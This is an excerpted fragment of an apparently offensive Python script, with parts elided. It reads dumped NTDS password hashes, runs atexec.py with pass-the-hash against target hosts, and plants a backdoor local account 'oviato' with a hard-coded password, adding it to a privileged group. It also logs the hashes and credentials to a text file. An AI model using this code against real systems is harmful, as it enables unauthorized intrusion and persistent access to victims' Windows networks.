...
for line in cmd:
 ...
 try:
        ...
        if (':' in open(cmz[1]+".ntds").read()):
                ...
                payload = '"net user oviato N0th1ng@! /add && net localgroup '+localgroup + ' oviato /add"'
                atexec = 'python3 atexec.py -hashes ' + hashes + ' ' + c + ' ' + payload
                print(g+'<atexec> '+d +hashes+ ' ' +c)
                print(payload)
                print(hashes + ' ' + c + '|oviato|N0th1ng@!')
                with open('oviatolist.txt', 'a+') as f:
                        f.write(hashes + ' ' + c +'|oviato|N0th1ng@!\n')
                os.system(atexec)
                pass
        else:
                pass
